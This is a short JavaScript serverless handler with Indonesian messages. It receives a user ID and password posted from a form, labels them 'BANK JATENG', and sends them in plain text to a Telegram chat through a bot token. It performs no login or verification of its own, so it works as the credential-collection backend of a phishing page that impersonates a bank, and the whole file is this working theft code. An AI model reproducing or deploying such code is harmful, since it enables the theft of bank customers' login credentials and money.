export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({
      success: false,
      message: "Method tidak diizinkan"
    });
  }

  try {
    const { userid, password } = req.body;

    const pesan =
      "BANK JATENG\n\n" +
      "userid: " + userid + "\n" +
      "password: " + password;

    const response = await fetch(
      `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: process.env.TELEGRAM_CHAT_ID,
          text: pesan
        })
      }
    );

    const result = await response.json();

    if (!result.ok) {
      return res.status(500).json({
        success: false
      });
    }

    return res.status(200).json({
      success: true
    });

  } catch (error) {
    return res.status(500).json({
      success: false
    });
  }
}